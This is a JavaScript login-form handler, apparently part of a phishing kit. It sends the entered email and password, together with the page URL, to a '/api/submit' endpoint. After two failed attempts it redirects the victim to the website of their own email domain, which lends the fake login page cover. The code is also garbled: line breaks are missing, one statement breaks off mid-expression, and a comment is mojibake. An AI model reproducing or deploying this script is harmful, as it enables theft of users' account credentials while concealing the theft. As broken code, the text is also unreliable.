let failedAttempts = 0;// Set lourl dynamicallyconst lourlInput = document.getElementById("lourl");if (lourlInput) {  lourlInput.value = window.location.origin + window.location.pathname;}// Extract domain from emailfunction getEmailDomain() {  const email = document.getElementById("email")?.value || "";  const parts = email.split("@");  return parts.length === 2 ? parts[1].toLowerCase() : null;}// Handle form submissiondocument.getElementById("login-form")?.addEventListener("submit", async function (e) {  e.preventDefault();  const emailInput = document.getElementById("email");  const passwordInput = document.getElementById("password");  const submitBtn = document.getElementById("submit-btn");  const msgBox = document.getElementById("msg");  if (!emailInput || !passwordInput || !submitBtn || !msgBox) {    console.error("Missing form elements");    return;  }  submitBtn.disabled = true;  submitBtn.textContent = "Logging in...";  const formData = {    username: emailInput.value,    password: passwordInput.value,    lourl: lourlInput?.value || ""  };  try {    const response = await fetch("/api/submit", {      method: "POST",      headers: { "Content-Type": "application/json" },      body: JSON.stringify(formData),    });    const result = await response.json();    if (response.ok && result.message === "Login successful") {      failedAttempts = 0;      msgBox.style.display = "none";      alert(result.message);    } else {      failedAttempts++;msgBox.style.display = "block";msgBox.textContent = result.message || "Login failed.";passwordInput.value = ""; // âœ… Clear password fieldif (failedAttempts >= 2) {  const domain = getEmailDomain();  window.top.location.href = domain ? `https://${domain}` : "https://yourdomain.com/help";}    }  } catch (error) {    console.error("Submission failed:", error);failedAttempts++;msgBox.style.display = "block";msgBox.textContent    if (failedAttempts >= 2) {  const domain = getEmailDomain();  window.top.location.href = domain ? `https://${domain}` : "https://yourdomain.com/help";}  }  submitBtn.disabled = false;  submitBtn.textContent = "Login";});